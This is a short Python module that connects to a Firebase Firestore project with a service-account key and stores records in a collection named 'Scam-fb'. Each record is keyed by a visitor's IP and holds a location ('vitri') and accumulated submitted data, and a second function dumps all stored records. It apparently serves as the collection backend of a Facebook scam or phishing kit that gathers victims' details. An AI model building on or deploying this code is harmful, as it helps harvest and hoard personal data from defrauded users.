import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
from firebase_admin import auth
from ast import literal_eval

cred = credentials.Certificate(cert='admin.json')
firebase_admin.initialize_app(cred, {'project_id': 'hdhautotool-1597995155785'})
app = firebase_admin.get_app()
auth.Client(app)
db = firestore.client(app)

def send(ip,vitri,data):
    loi = 0
    doc =  db.collection(u'Scam-fb').get()
    for name in doc:
        if ip == name.id:
            loi = 1
            break
    if loi == 1:
        db.collection('Scam-fb').document(ip).update({'Data':firestore.ArrayUnion([data])})

    if loi == 0:
        doc_ref = db.collection(u'Scam-fb').document(ip)
        doc_ref.set({
            'ip' : ip,
            'vitri' : vitri,
            'Data':firestore.ArrayUnion([data])
            })



def get_data():
    doc =  db.collection(u'Scam-fb').get()
    cong = []
    for name in doc:
        tt = literal_eval(str(db.collection(u'Scam-fb').document(name.id).get().to_dict()))
        out = {name.id:tt}
        cong  += [out]
    return cong

